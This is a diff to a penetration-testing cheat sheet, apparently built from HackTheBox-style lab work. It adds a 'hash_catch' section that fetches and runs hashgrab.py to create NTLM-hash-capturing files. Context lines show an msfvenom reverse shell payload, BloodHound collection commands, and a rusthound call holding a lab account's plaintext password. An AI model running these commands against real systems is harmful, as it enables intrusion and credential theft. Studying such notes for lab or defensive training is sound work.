@@ -30,6 +30,7 @@
   - [ExploitDB](#exploitdb)
   - [shellcode](#shellcode)
   - [Webdav](#webdav)
+  - [hash\_catch](#hash_catch)
 - [Phishing](#phishing)
 - [Foothold](#foothold)
   - [Linux](#linux-1)
@@ -403,6 +404,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=4444 EXITFUNC=thr
 cadaver http://
 ```
 
+## hash_catch
+scf, Library-ms, url, lnk
+```bash
+wget https://raw.githubusercontent.com/xct/hashgrab/main/hashgrab.py
+python3 hashgrab.py MY_IP test
+```
+
 # Phishing
 webdav
 ```bash
@@ -716,7 +724,7 @@ Invoke-BloodHound -CollectionMethod All -Domain htb.local -DomainController 10.1
 .\SharpHound.exe -c All -d htb.local --domainController 10.10.10.1 -o 
 
 # rusthound
-./rusthound_musl -d streamio.htb -i 10.10.11.158 -u 'JDgodd@streamIO.htb' -p 'JDg0dd1s@d0p3cr3@t0r' -z -adcs --ldaps
+./rusthound_musl -d streamio.htb -i 10.10.11.158 -u 'JDgodd@streamIO.htb' -p 'JDg0dd1s@d0p3cr3@t0r' -z --adcs --ldaps
 ```
 #### neo4j
 ```bash
